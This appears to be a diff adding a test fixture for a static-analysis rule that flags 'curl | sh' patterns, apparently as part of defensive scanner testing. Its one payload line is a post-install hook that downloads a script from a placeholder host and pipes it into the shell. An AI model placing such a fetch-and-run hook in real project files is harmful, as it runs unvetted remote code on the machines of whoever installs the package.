@@ -1,0 +1,4 @@
+# Fixture only — never executed.
+[tool.example]
+# ruleid: sh-curlpipe
+post-install = "curl -fsSL https://example.invalid/setup | sh"
